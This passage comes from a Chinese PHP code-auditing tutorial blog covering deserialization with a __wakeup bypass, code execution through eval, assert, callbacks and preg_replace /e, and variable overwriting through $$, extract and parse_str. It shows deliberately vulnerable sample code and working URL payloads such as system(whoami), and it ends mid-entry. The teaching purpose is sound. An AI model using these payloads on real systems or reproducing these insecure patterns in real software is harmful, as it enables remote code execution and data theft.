class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span>                    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">else</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Wrong filename.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>         <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token operator">=</span><span class="token string">'3.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'3.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">else</span><span class="token punctuation">{</span>         <span class="token variable">$file</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token delimiter">?></span> <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--key in flag.php--></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审计代码，可以发现要得到KEY，思路如下： </p><ul><li>源码最后提示，KEY在flag.php里面 </li><li>注意到__destruct魔术方法中，有这么一段代码，将file文件内容显示出来 </li></ul><pre class="line-numbers language-php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">FILE</span><span class="token punctuation">)</span><span class="token punctuation">.</span>’<span class="token operator">/</span>‘<span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>若GET“file”参数为序列化对象，且将file设为flag.php；那么可以通过unserialize反序列化，进而调用__destruct魔术方法来显示flag.php源码（要注意的是file参数内容需要经过base64编码）</li><li>在生成对象时，__wakeup方法定义了file的值</li><li>总结下来就是，想办法把file设为flag.php，调用<strong>destruct方法，且绕过</strong>wakeup</li></ul><p>这个__wakeip绕过方法也很简单，当序列化字符串中，表示对象属性个数的值大于实际属性个数时，那么就会跳过wakeup方法的执行，所以payload就出来了：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>Tzo1OiJTb0Z1biI6Mjp7Uzo0OiJmaWxlIjtTOjg6ImZsYWcucGhwIjt9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020120816385146.png" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>对用户的输入进行严格的过滤，最好采用正则匹配</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：代码执行漏洞</title>
      <link href="/posts/750291cd.html"/>
      <url>/posts/750291cd.html</url>
      
        <content type="html"><![CDATA[<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><blockquote><p>PHP代码执行漏洞可以将代码注入到应用中，最终到webserver去执行。该漏洞主要存在于eval()、assert()、preg_replace()、call_user_func()、array_map()以及动态函数中。</p></blockquote><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><ul><li>用户能够控制函数的输入</li><li>存在可执行代码的危险函数</li></ul><h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="eval-和assert"><a href="#eval-和assert" class="headerlink" title="eval()和assert()"></a>eval()和assert()</h4><p>eval()、assert()将输入的字符串参数当作PHP代码来执行.</p><p>举个例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#assert(</span><span class="token string">"$cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'当前没有可执行的代码！'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php也是可以执行系统命令的，通过<strong>system()</strong>函数实现：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126103148947.png#pic_center" alt="在这里插入图片描述"></p><h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h4><p><strong>call_user_func</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126144903837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>具体可以这么实现：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">callBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment"># 回调函数</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">'callBack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126151107167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数"></a>动态执行函数</h3><ol><li>定义一个函数</li><li>将函数名（字符串）赋值给一个变量</li><li>使用变量名代替函数名动态调用函数</li></ol><p>测试代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment"># a作为函数，b作为函数的参数</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>a<span class="token operator">=</span>assert<span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126153256493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="preg-replace-代码执行"><a href="#preg-replace-代码执行" class="headerlink" title="preg_replace()代码执行"></a>preg_replace()代码执行</h3><p>preg_replace()函数就是通过正则替换，但是当正则中包含变量的情况下，会造成一个代码执行。</p><h4 id="第一个参数"><a href="#第一个参数" class="headerlink" title="第一个参数"></a>第一个参数</h4><p>先来举一个例子，preg_replace中/e模式会将过滤后的字符串当作php代码执行，假如它将我们输入的内容拼接到了正则表达式中，那么我们可以构造一个含有代码执行漏洞的正则表达式：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$Str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/&lt;php>(.*?).$cmd"</span><span class="token punctuation">,</span><span class="token string">"\\1"</span><span class="token punctuation">,</span><span class="token string">"$Str"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据正则构造payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token number">1</span><span class="token operator">/</span>e<span class="token operator">&amp;</span>str<span class="token operator">=</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>php</span><span class="token punctuation">></span></span></span><span class="token function">system</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126173243230.png#pic_center" alt="在这里插入图片描述"></p><h4 id="第二个参数"><a href="#第二个参数" class="headerlink" title="第二个参数"></a>第二个参数</h4><p>第二个参数是，替换的字符串，当正则匹配上之后，程序将匹配的内容替换为第二个参数中的内容，如果第二个参数用户可控，那么也有可能造成代码执行：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/.ak.*php/e"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>str<span class="token operator">=</span>1akphp<span class="token operator">&amp;</span>cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span>whoami<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201126173935827.png#pic_center" alt="在这里插入图片描述"></p><h4 id="第三个参数"><a href="#第三个参数" class="headerlink" title="第三个参数"></a>第三个参数</h4><p>假如我们对输入可控，程序又没有做严格的替换，也会代码执行：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\[php\](.*?)ak/e"</span><span class="token punctuation">,</span><span class="token string">"\\1"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020112617445267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><ul><li>尽量不要执行外部应用程序或命令</li><li>使用自定义函数或函数库来代替外部应用程序或命令的功能</li><li>使用escapeshellarg()函数过滤</li><li>使用safe_mode_exec_dir来指定可执行文件路径</li><li>将执行函数的参数做白名单限制，在代码或配置中限制某些参数</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础：变量覆盖漏洞</title>
      <link href="/posts/908580e2.html"/>
      <url>/posts/908580e2.html</url>
      
        <content type="html"><![CDATA[<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><blockquote><p>变量覆盖，是指变量未初始化，我们定义的参数值，可以替换程序原有的变量值。</p></blockquote><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><blockquote><p>通常结合程序其他的漏洞实现完整的攻击。比如文件上传，覆盖掉原来白名单的列表，导致任意文件上传；用户注册界面控制没有覆盖的变量，导致SQL注入</p></blockquote><h3 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h3><p>主要还是以下几个函数</p><ul><li>extract()</li><li>import_request_variables()</li><li>parse_str()</li><li>$$</li></ul><h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><p>这是一道CTF原题：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_403</span> <span class="token operator">=</span> <span class="token string">"Access Denied"</span><span class="token punctuation">;</span><span class="token variable">$_200</span> <span class="token operator">=</span> <span class="token string">"Welcome Admin"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REQUEST_METHOD"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment">#var_dump($_SERVER);</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Oh no..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_403</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   $<span class="token variable">$key</span> <span class="token operator">=</span> $<span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   $<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"flag"</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$flag</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_403</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"This is your flag : "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$_200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题通读源码后能得到以下几点：</p><ul><li>POST的数据必须是flag</li><li>GET与POST的值会经过foreach遍历，且先遍历GET</li><li>如果POST的值不等于$flag，程序终止</li></ul><p>这样一来，payload就有了，我们只要GET传一个flag为空，$$会覆盖掉前面include的值，POST一个flag为空，就满足最后的if条件，$_POST[“flag”] !== $flag</p><p>payload: </p><pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># 这里不用定义GET的值，没必要，直接POST一个空的flag值就行</span><span class="token constant">POST</span>flag<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201206200733597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>extract.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"./flag.php"</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*var_dump($_GET);echo "&lt;br>";*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$gift</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$gift</span> <span class="token operator">==</span> <span class="token variable">$content</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'flag{You_Are_Good}'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Oh..'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目使用了<strong>extract($_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</strong></p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>flag<span class="token operator">=</span>xxx<span class="token operator">&amp;</span><span class="token variable">$gift</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里关键的要求就是$gift == $content，而$content又是从$flag中读取文件，所以我们传一个不存在的文件名且让$gift为空就行了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201206204837958.png" alt="在这里插入图片描述"></p><h3 id="parse-str-变量覆盖"><a href="#parse-str-变量覆盖" class="headerlink" title="parse_str()变量覆盖"></a>parse_str()变量覆盖</h3><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201206215257720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来看一道CTF源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"www.OPENCTF.com"</span><span class="token punctuation">;</span>            <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            @<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'Don\'t worry, it is easy! '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关键代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>@<span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里的解题思路就是我们要传一个xx=xx这样的值，经过parse_str处理后，就成了$xx=xx，再有就是后面的条件，就是一个md5碰撞，这样一来payload就出来了：</p><pre class="line-numbers 